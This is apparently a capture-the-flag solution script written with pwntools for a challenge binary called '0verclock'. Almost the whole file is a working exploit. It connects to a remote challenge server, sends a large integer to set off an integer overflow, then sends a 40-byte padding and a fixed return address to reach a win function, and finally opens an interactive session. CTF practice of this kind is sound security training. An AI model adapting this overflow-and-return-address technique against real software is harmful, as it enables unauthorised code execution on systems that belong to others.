#!/usr/bin/env python3
from pwn import *

context.update(arch='x86')
exe = './0verclock'


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# p = start()
p = remote("gc1.eng.run", 30831)

#Integer overflow with ret2win
p.sendline(b"2147483638")
p.recv()
p.sendline(b"A"*40 + p64(0x40128c))

p.interactive()

